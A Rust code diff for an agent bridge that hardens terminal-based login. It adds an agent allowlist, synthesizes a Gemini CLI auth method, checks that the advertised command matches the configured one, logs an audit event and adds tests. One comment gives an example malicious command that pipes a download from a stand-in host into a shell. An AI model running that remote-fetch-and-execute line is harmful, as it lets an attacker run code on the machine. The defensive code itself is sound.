@@ -12,7 +12,7 @@ use crate::agent_runtime::{AgentDefinition, AgentKind};
 use crate::notify::{activity_event, Severity as NotifySeverity};
 use crate::ws::envelope::{ClientCommand, ServerEvent};
 use bridge_core::{EventRing, StateHolder};
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::process::Stdio;
 use std::sync::Arc;
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
@@ -80,6 +80,12 @@ pub struct AcpRuntime {
     pub(crate) audit: Option<Arc<crate::audit::AuditFacility>>,
     /// ACP wire tap for debug logging and `acp.debug_message` emission.
     pub(crate) debug: Option<Arc<AcpDebugLog>>,
+    /// Configured agent command (from `agents.toml`). Used by
+    /// `authenticate_via_acp` to verify any terminal-auth command
+    /// advertised by the adapter actually matches the agent we spawned
+    /// — the bridge refuses to launch arbitrary commands even when an
+    /// allowlisted agent is involved.
+    pub(crate) agent_command: PathBuf,
 }
 
 const APPROVAL_CORRELATION_TTL: std::time::Duration = std::time::Duration::from_secs(60);
@@ -174,6 +180,13 @@ pub enum AuthenticateError {
         code: &'static str,
         message: String,
     },
+    /// Method type is `terminal` but the agent is not on the bridge's
+    /// terminal-auth allowlist. The bridge refuses to run terminal
+    /// commands for arbitrary adapters — only agents we’ve explicitly
+    /// vetted (currently just `gemini-acp`) may use this path. This
+    /// stops a malicious or compromised ACP adapter from advertising a
+    /// terminal-auth command that would execute locally.
+    TerminalAuthNotAllowed { method_id: String, agent_id: String },
 }
 
 impl AuthenticateError {
@@ -187,6 +200,7 @@ impl AuthenticateError {
             }
             AuthenticateError::EnvVarRecreateRequired { .. } => "auth.env_var_recreate_required",
             AuthenticateError::AdapterFailed { code, .. } => code,
+            AuthenticateError::TerminalAuthNotAllowed { .. } => "auth.terminal_auth_not_allowed",
         }
     }
 
@@ -198,7 +212,8 @@ impl AuthenticateError {
             AuthenticateError::MethodNotAdvertised(id) => Some(id),
             AuthenticateError::TerminalCapabilityDisabled { method_id }
             | AuthenticateError::EnvVarRecreateRequired { method_id, .. }
-            | AuthenticateError::AdapterFailed { method_id, .. } => Some(method_id),
+            | AuthenticateError::AdapterFailed { method_id, .. }
+            | AuthenticateError::TerminalAuthNotAllowed { method_id, .. } => Some(method_id),
         }
     }
 
@@ -208,6 +223,7 @@ impl AuthenticateError {
             AuthenticateError::TerminalCapabilityDisabled { .. } => Some("terminal"),
             AuthenticateError::EnvVarRecreateRequired { .. } => Some("env_var"),
             AuthenticateError::AdapterFailed { method_type, .. } => Some(method_type),
+            AuthenticateError::TerminalAuthNotAllowed { .. } => Some("terminal"),
             _ => None,
         }
     }
@@ -229,6 +245,9 @@ impl AuthenticateError {
                 "auth method '{method_id}' requires env vars set in the bridge's launch environment; close and recreate the session after exporting them"
             ),
             AuthenticateError::AdapterFailed { message, .. } => message.clone(),
+            AuthenticateError::TerminalAuthNotAllowed { method_id, agent_id } => format!(
+                "terminal auth method '{method_id}' is not allowed for agent '{agent_id}' (only allowlisted agents may use bridge-driven terminal auth)"
+            ),
         }
     }
 }
@@ -268,6 +287,74 @@ pub struct SpawnOptions {
     /// Workflow spec id to use for this session's WorkflowProcess.
     /// When `None`, the registry default is used.
     pub workflow_id: Option<String>,
+}
+
+/// Allowlist of agent ids that may use bridge-driven terminal auth.
+/// Anything outside this list returns `auth.terminal_auth_not_allowed`
+/// even if the adapter advertises a terminal auth method. Keep this
+/// as small as possible — each entry is effectively
+/// “this CLI’s configured command may be invoked locally for login”.
+const TERMINAL_AUTH_ALLOWED_AGENTS: &[&str] = &["gemini-acp"];
+
+/// Synthetic auth method id for the Gemini CLI ACP login flow. Mirrors
+/// Zed’s `GEMINI_TERMINAL_AUTH_METHOD_ID = "spawn-gemini-cli"` so the
+/// cockpit renders the same affordance Zed users see.
+pub const GEMINI_TERMINAL_AUTH_METHOD_ID: &str = "spawn-gemini-cli";
+
+/// Strip ACP runtime flags from a command’s args. Used when the bridge
+/// synthesizes a terminal-auth invocation — the auth flow needs the
+/// CLI in interactive (login) mode, not in ACP server mode.
+pub(crate) fn strip_acp_args(args: &[String]) -> Vec<String> {
+    args.iter()
+        .filter(|a| a.as_str() != "--acp" && a.as_str() != "--experimental-acp")
+        .cloned()
+        .collect()
+}
+
+/// Build the synthetic Gemini terminal-auth method JSON. The command
+/// and args come straight from the configured `AgentDefinition` (with
+/// ACP flags removed) — the adapter never gets to influence what we
+/// run.
+fn synthesize_gemini_terminal_auth_method(
+    agent_command: &Path,
+    agent_args: &[String],
+) -> serde_json::Value {
+    let stripped = strip_acp_args(agent_args);
+    serde_json::json!({
+        "id": GEMINI_TERMINAL_AUTH_METHOD_ID,
+        "type": "terminal",
+        "name": "Login with Gemini CLI",
+        "description": "Login with your Google or Vertex AI account",
+        "_meta": {
+            "terminal-auth": {
+                "command": agent_command.to_string_lossy(),
+                "args": stripped,
+            }
+        }
+    })
+}
+
+/// Append a synthesized terminal-auth method to whatever the adapter
+/// advertised. If the adapter already advertises a method with the
+/// same id, we leave it alone — the per-agent allowlist + command
+/// match check in `authenticate_via_acp` is the actual safety gate.
+fn merge_synthetic_terminal_auth_method(
+    advertised: serde_json::Value,
+    synthesized: serde_json::Value,
+) -> serde_json::Value {
+    let mut arr = advertised.as_array().cloned().unwrap_or_default();
+    let synth_id = synthesized
+        .get("id")
+        .and_then(|v| v.as_str())
+        .unwrap_or_default()
+        .to_string();
+    let already_present = arr
+        .iter()
+        .any(|m| m.get("id").and_then(|v| v.as_str()) == Some(synth_id.as_str()));
+    if !already_present {
+        arr.push(synthesized);
+    }
+    serde_json::Value::Array(arr)
 }
 
 impl SessionHandle {
@@ -635,6 +722,17 @@ impl SessionHandle {
         // bridge launch the login flow itself without enabling
         // terminal/* ACP tool capability.
         if method_type == "terminal" {
+            // Patch C — allowlist gate. Only specific agent ids may
+            // run terminal-auth commands at all. This is the primary
+            // defense against a malicious or compromised ACP adapter
+            // advertising a terminal-auth command we'd otherwise
+            // execute locally.
+            if !TERMINAL_AUTH_ALLOWED_AGENTS.contains(&self.agent_id.as_str()) {
+                return Err(AuthenticateError::TerminalAuthNotAllowed {
+                    method_id: method_id.to_string(),
+                    agent_id: self.agent_id.clone(),
+                });
+            }
             let terminal_auth = method
                 .get("_meta")
                 .and_then(|m| m.get("terminal-auth"))
@@ -666,6 +764,62 @@ impl SessionHandle {
                 .iter()
                 .map(|arg| arg.as_str().unwrap_or_default().to_string())
                 .collect::<Vec<_>>();
+
+            // Patch C — verify the advertised command basename matches
+            // the agent we actually spawned. The synthesized
+            // `spawn-gemini-cli` method trivially passes; an adapter
+            // that tries to slip in a different command (e.g. /bin/sh
+            // -c "curl evil.example | sh") gets rejected with
+            // `auth.command_invalid`.
+            let configured_basename = acp.agent_command.file_name().map(|s| s.to_owned());
+            let advertised_basename = Path::new(command).file_name().map(|s| s.to_owned());
+            if configured_basename.is_none() || configured_basename != advertised_basename {
+                return Err(AuthenticateError::AdapterFailed {
+                    method_id: method_id.to_string(),
+                    method_type: method_type.clone(),
+                    code: "auth.command_invalid",
+                    message: format!(
+                        "terminal auth command '{}' basename does not match configured agent command",
+                        command
+                    ),
+                });
+            }
+            // Patch C — ACP runtime flags must be stripped from the
+            // auth invocation. If the adapter snuck them back in, we
+            // refuse to launch the login flow in ACP server mode.
+            if args
+                .iter()
+                .any(|a| a == "--acp" || a == "--experimental-acp")
+            {
+                return Err(AuthenticateError::AdapterFailed {
+                    method_id: method_id.to_string(),
+                    method_type: method_type.clone(),
+                    code: "auth.command_invalid",
+                    message: "terminal auth args must not include ACP runtime flags (--acp, --experimental-acp)".into(),
+                });
+            }
+
+            // Audit: log the *basename* of what we're about to run
+            // so operators can see the local exec without leaking
+            // secrets that might appear in env or args.
+            let cmd_basename = Path::new(command)
+                .file_name()
+                .map(|s| s.to_string_lossy().to_string())
+                .unwrap_or_else(|| command.to_string());
+            if let Some(audit) = self.audit.as_ref() {
+                audit.log(
+                    &self.id,
+                    "session",
+                    bridge_core::AuditSeverity::Info,
+                    serde_json::json!({
+                        "event": "terminal_auth_launch",
+                        "auth_method_id": method_id,
+                        "agent_id": self.agent_id,
+                        "command_basename": cmd_basename,
+                        "args_count": args.len(),
+                    }),
+                );
+            }
 
             let mut auth_cmd = tokio::process::Command::new(command);
             auth_cmd
@@ -1240,16 +1394,31 @@ impl SessionHandle {
 
         let mut update_rx = client.subscribe_updates();
         let permission_rx = client.take_permission_receiver().await;
+        // Patch B — Gemini CLI doesn't advertise an ACP-style auth
+        // method (it uses an interactive `/auth` flow), so the bridge
+        // synthesizes a Zed-style `spawn-gemini-cli` terminal auth
+        // method from the configured agent command + args (with ACP
+        // runtime flags stripped). The adapter still can't influence
+        // the command we run — the synthesized method points at
+        // `opts.agent.command`, not anything the adapter advertised.
+        let auth_methods = if opts.agent.id == "gemini-acp" {
+            let synthesized =
+                synthesize_gemini_terminal_auth_method(&opts.agent.command, &opts.agent.args);
+            merge_synthetic_terminal_auth_method(init.auth_methods.clone(), synthesized)
+        } else {
+            init.auth_methods.clone()
+        };
         let acp_runtime = Arc::new(AcpRuntime {
             client,
             acp_session_id: acp_session_id.clone(),
-            auth_methods: init.auth_methods.clone(),
+            auth_methods,
             pending_approvals: dashmap::DashMap::new(),
             permission_timeout_ms: opts.agent.permission_timeout_ms,
             approval_by_tool_call_id: dashmap::DashMap::new(),
             approval_by_full_hash: dashmap::DashMap::new(),
             audit: opts.audit.clone(),
             debug: Some(Arc::clone(&debug)),
+            agent_command: opts.agent.command.clone(),
         });
 
         // Resolve workflow spec. Unknown ids are rejected upstream at the
@@ -1984,5 +2153,115 @@ mod approval_picker_tests {
     fn reject_errors_when_no_reject_option() {
         let no_reject = vec![json!({"kind":"allow_once","optionId":"AO"})];
         assert!(pick_reject_option_id(&no_reject).is_err());
+    }
+}
+
+#[cfg(test)]
+mod gemini_terminal_auth_tests {
+    //! Pure unit tests for the synthesis helpers + allowlist constants.
+    //! The integration matrix (allowlist gate, command-mismatch reject)
+    //! lives in `tests/session_authenticate.rs`.
+    use super::*;
+
+    #[test]
+    fn strip_acp_args_removes_only_acp_runtime_flags() {
+        let input = vec![
+            "--acp".to_string(),
+            "--auth-methods".to_string(),
+            "[]".to_string(),
+            "--experimental-acp".to_string(),
+            "--debug".to_string(),
+        ];
+        let stripped = strip_acp_args(&input);
+        assert_eq!(
+            stripped,
+            vec![
+                "--auth-methods".to_string(),
+                "[]".to_string(),
+                "--debug".to_string(),
+            ],
+            "strip_acp_args must remove --acp and --experimental-acp and keep everything else"
+        );
+    }
+
+    #[test]
+    fn strip_acp_args_passes_through_when_no_acp_flag_present() {
+        let input = vec!["--login".to_string(), "--quiet".to_string()];
+        let stripped = strip_acp_args(&input);
+        assert_eq!(stripped, input, "non-ACP args must be untouched");
+    }
+
+    #[test]
+    fn synthesize_gemini_method_uses_configured_command_with_acp_args_stripped() {
+        let cmd = std::path::PathBuf::from("/usr/local/bin/gemini");
+        let args = vec![
+            "--acp".to_string(),
+            "--debug".to_string(),
+            "--experimental-acp".to_string(),
+        ];
+        let m = synthesize_gemini_terminal_auth_method(&cmd, &args);
+        assert_eq!(m["id"], serde_json::json!(GEMINI_TERMINAL_AUTH_METHOD_ID));
+        assert_eq!(m["type"], serde_json::json!("terminal"));
+        assert_eq!(
+            m["_meta"]["terminal-auth"]["command"],
+            serde_json::json!("/usr/local/bin/gemini")
+        );
+        // ACP runtime flags must have been stripped from the synthesized
+        // invocation — the auth flow needs interactive mode, not ACP.
+        assert_eq!(
+            m["_meta"]["terminal-auth"]["args"],
+            serde_json::json!(["--debug"])
+        );
+    }
+
+    #[test]
+    fn merge_synthetic_skips_when_id_already_present() {
+        let advertised = serde_json::json!([
+            { "id": GEMINI_TERMINAL_AUTH_METHOD_ID, "type": "terminal" }
+        ]);
+        let synthesized = serde_json::json!({
+            "id": GEMINI_TERMINAL_AUTH_METHOD_ID,
+            "type": "terminal",
+            "_meta": { "terminal-auth": { "command": "x", "args": [] } }
+        });
+        let merged = merge_synthetic_terminal_auth_method(advertised.clone(), synthesized);
+        assert_eq!(merged, advertised, "existing entry with same id must win");
+    }
+
+    #[test]
+    fn merge_synthetic_appends_when_advertised_array_is_empty() {
+        let advertised = serde_json::json!([]);
+        let synthesized = serde_json::json!({
+            "id": GEMINI_TERMINAL_AUTH_METHOD_ID,
+            "type": "terminal"
+        });
+        let merged = merge_synthetic_terminal_auth_method(advertised, synthesized.clone());
+        let arr = merged.as_array().expect("merged must be an array");
+        assert_eq!(arr.len(), 1);
+        assert_eq!(arr[0], synthesized);
+    }
+
+    #[test]
+    fn terminal_auth_allowlist_is_minimal_and_includes_gemini() {
+        assert!(
+            TERMINAL_AUTH_ALLOWED_AGENTS.contains(&"gemini-acp"),
+            "gemini-acp must be allowlisted"
+        );
+        assert!(
+            !TERMINAL_AUTH_ALLOWED_AGENTS.contains(&"claude-acp"),
+            "claude-acp uses adapter OAuth, must NOT be allowlisted for terminal auth"
+        );
+    }
+
+    #[test]
+    fn authenticate_error_terminal_auth_not_allowed_has_stable_code() {
+        let err = AuthenticateError::TerminalAuthNotAllowed {
+            method_id: "x".into(),
+            agent_id: "some-agent".into(),
+        };
+        assert_eq!(err.code(), "auth.terminal_auth_not_allowed");
+        assert_eq!(err.method_type(), Some("terminal"));
+        assert_eq!(err.method_id(), Some("x"));
+        assert!(err.message().contains("some-agent"));
     }
 }
